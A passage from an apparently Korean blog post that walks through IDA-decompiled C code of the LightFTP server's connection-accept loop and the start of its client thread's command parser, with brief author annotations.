</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr.sa_data[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)addr.sa_data <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ROL2__</span>(word_10110, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">struct</span> in_addr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr.sa_data[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> in;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">bind</span>(v2, <span style="color:#f92672">&amp;</span>addr, <span style="color:#ae81ff">0x10u</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74"> Failed to start server. Can not bind to address</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(v3);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">close</span>(v2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">writelogentry</span>(<span style="color:#ae81ff">0LL</span>, <span style="color:#e6db74">&#34;220 LightFTP server ready</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">listen</span>(v2, <span style="color:#ae81ff">4096</span>) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              addr_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>              addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>              v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(v2, <span style="color:#f92672">&amp;</span>addr, <span style="color:#f92672">&amp;</span>addr_len);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ( v6 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> );
</span></span><span style="display:flex;"><span>            optval <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>dword_10108 )
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            v7 <span style="color:#f92672">=</span> v3;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">*</span>v7 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">++</span>v7 <span style="color:#f92672">==</span> <span style="color:#f92672">&amp;</span>v3[dword_10108] )
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">goto</span> LABEL_16;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( dword_1010C )
</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">socket_set_keepalive</span>(v6);
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>v7 <span style="color:#f92672">=</span> v6;
</span></span><span style="display:flex;"><span>            optval <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>v11, <span style="color:#ae81ff">0LL</span>, ftp_client_thread, v7);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( optval )
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">*</span>v7 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ( optval )
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>LABEL_16:
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">send</span>(v6, <span style="color:#e6db74">&#34;MAXIMUM ALLOWED USERS CONNECTED</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x21uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">close</span>(v6);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(v3);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">close</span>(v2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>마찬가지로 ftp_client_thread만 보면된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// positive sp value has been detected, the output may be wrong!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftp_client_thread</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// edi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> v4; <span style="color:#75715e">// bl
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">**</span>v5; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> v9; <span style="color:#75715e">// r13
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v10; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v11; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>v12; <span style="color:#75715e">// r12
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v14; <span style="color:#75715e">// ebp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">float</span> v15; <span style="color:#75715e">// xmm1_4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">double</span> v16; <span style="color:#75715e">// xmm1_8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">float</span> v17; <span style="color:#75715e">// xmm0_4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v18; <span style="color:#75715e">// [rsp-100h] [rbp-6130h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v19; <span style="color:#75715e">// [rsp-F8h] [rbp-6128h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_mutexattr_t</span> <span style="color:#f92672">*</span>v20; <span style="color:#75715e">// [rsp-F0h] [rbp-6120h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">socklen_t</span> v21; <span style="color:#75715e">// [rsp-DCh] [rbp-610Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v22; <span style="color:#75715e">// [rsp-D8h] [rbp-6108h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_mutexattr_t</span> v23; <span style="color:#75715e">// [rsp-CCh] [rbp-60FCh] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> sockaddr v24; <span style="color:#75715e">// [rsp-C8h] [rbp-60F8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_mutex_t</span> mutex; <span style="color:#75715e">// [rsp-B8h] [rbp-60E8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v26; <span style="color:#75715e">// [rsp-90h] [rbp-60C0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v27; <span style="color:#75715e">// [rsp-8Ch] [rbp-60BCh]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_t</span> v28; <span style="color:#75715e">// [rsp-88h] [rbp-60B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v29; <span style="color:#75715e">// [rsp-80h] [rbp-60B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v30; <span style="color:#75715e">// [rsp-78h] [rbp-60A8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v31; <span style="color:#75715e">// [rsp-74h] [rbp-60A4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v32; <span style="color:#75715e">// [rsp-70h] [rbp-60A0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int16</span> v33; <span style="color:#75715e">// [rsp-6Ch] [rbp-609Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v34; <span style="color:#75715e">// [rsp-68h] [rbp-6098h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v35; <span style="color:#75715e">// [rsp-64h] [rbp-6094h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int32</span> v36; <span style="color:#75715e">// [rsp-5Ch] [rbp-608Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v37; <span style="color:#75715e">// [rsp-40h] [rbp-6070h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v38; <span style="color:#75715e">// [rsp+0h] [rbp-6030h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v39; <span style="color:#75715e">// [rsp+1000h] [rbp-5030h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v40; <span style="color:#75715e">// [rsp+4FC0h] [rbp-1070h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v41; <span style="color:#75715e">// [rsp+4FC8h] [rbp-1068h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v42; <span style="color:#75715e">// [rsp+4FD0h] [rbp-1060h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> v43; <span style="color:#75715e">// [rsp+4FD8h] [rbp-1058h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> v44; <span style="color:#75715e">// [rsp+4FE0h] [rbp-1050h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> instr_recved[<span style="color:#ae81ff">521</span>]; <span style="color:#75715e">// [rsp+4FE8h] [rbp-1048h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">&amp;</span>v38 <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>v39 <span style="color:#f92672">-</span> <span style="color:#ae81ff">3072</span>) )
</span></span><span style="display:flex;"><span>    ;
</span></span><span style="display:flex;"><span>  v18 <span style="color:#f92672">=</span> a1;
</span></span><span style="display:flex;"><span>  instr_recved[<span style="color:#ae81ff">513</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>mutex, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x50A0uLL</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>a1;
</span></span><span style="display:flex;"><span>  v21 <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>  v26 <span style="color:#f92672">=</span> v1;
</span></span><span style="display:flex;"><span>  v24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">getsockname</span>(v1, <span style="color:#f92672">&amp;</span>v24, <span style="color:#f92672">&amp;</span>v21) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v21 <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    v30 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v24.sa_data[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>    v24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">getpeername</span>(v26, <span style="color:#f92672">&amp;</span>v24, <span style="color:#f92672">&amp;</span>v21) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v35 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      v31 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v24.sa_data[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>      v29 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFFLL</span>;
</span></span><span style="display:flex;"><span>      v27 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      v36 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_InterlockedIncrement</span>(<span style="color:#f92672">&amp;</span>g_newid);
</span></span><span style="display:flex;"><span>      v34 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_mutexattr_init</span>(<span style="color:#f92672">&amp;</span>v23);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_mutexattr_settype</span>(<span style="color:#f92672">&amp;</span>v23, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_mutex_init</span>(<span style="color:#f92672">&amp;</span>mutex, <span style="color:#f92672">&amp;</span>v23);
</span></span><span style="display:flex;"><span>      v37 <span style="color:#f92672">=</span> <span style="color:#ae81ff">47</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v40 )
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">__int64</span>))gnutls_record_send)(
</span></span><span style="display:flex;"><span>          v40,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;220 LightFTP server ready</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">27LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(v26, <span style="color:#e6db74">&#34;220 LightFTP server ready</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x1BuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(instr_recved, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>      ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))__snprintf_chk)(
</span></span><span style="display:flex;"><span>        instr_recved,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">4096LL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1LL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">4096LL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&lt;- New user IP=%u.%u.%u.%u:%u&#34;</span>,
</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)v24.sa_data[<span style="color:#ae81ff">2</span>],
</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)v24.sa_data[<span style="color:#ae81ff">3</span>],
</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)v24.sa_data[<span style="color:#ae81ff">4</span>],
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">HIBYTE</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v24.sa_data[<span style="color:#ae81ff">2</span>]),
</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)<span style="color:#a6e22e">__ROL2__</span>(<span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)v24.sa_data, <span style="color:#ae81ff">8</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)instr_recved, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>LABEL_10:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v26 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">recvcmd_part_0</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved, <span style="color:#ae81ff">0x1000LL</span>) )<span style="color:#75715e">// recvuntil \r\n
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        v4 <span style="color:#f92672">=</span> instr_recved[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">LOBYTE</span>(instr_recved[<span style="color:#ae81ff">0</span>]) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>();
</span></span><span style="display:flex;"><span>          v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( ((<span style="color:#f92672">*</span>v5)[(<span style="color:#66d9ef">char</span>)v4] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">++</span>v6;
</span></span><span style="display:flex;"><span>            v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v6);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 )
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v6;
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">goto</span> LABEL_41;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v6;
</span></span><span style="display:flex;"><span>          v8 <span style="color:#f92672">=</span> v6;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( (v4 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xDF</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">++</span>v8;
</span></span><span style="display:flex;"><span>              v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v8);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ( (v4 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xDF</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>            v9 <span style="color:#f92672">=</span> v8 <span style="color:#f92672">-</span> v6;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; &#39;</span> )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">++</span>v8;
</span></span><span style="display:flex;"><span>            v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v8);
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          v10 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v8;      <span style="color:#75715e">// Second Arg?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          v11 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( v4 )
</span></span><span style="display:flex;"><span>            v11 <span style="color:#f92672">=</span> v10;
</span></span><span style="display:flex;"><span>          v19 <span style="color:#f92672">=</span> v11;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved;
</span></span><span style="display:flex;"><span>LABEL_41:
</span></span><span style="display:flex;"><span>          v19 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        v12 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>ftpprocs;
</span></span><span style="display:flex;"><span>        v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#a6e22e">strncasecmp</span>(v7, <span style="color:#f92672">*</span>v12, v9) )     <span style="color:#75715e">// instruction parsing
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">++</span>v13;
</span></span><span style="display:flex;"><span>          v12 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( v13 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x20</span> )                    <span style="color:#75715e">// instruction cnts -&gt; 32
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; @@ CMD: &#34;</span>, (<span style="color:#66d9ef">__int64</span>)instr_recved);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( v40 )
</span></span><span style="display:flex;"><span>              ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">__int64</span>))gnutls_record_send)(
</span></span><span style="display:flex;"><span>                v40,
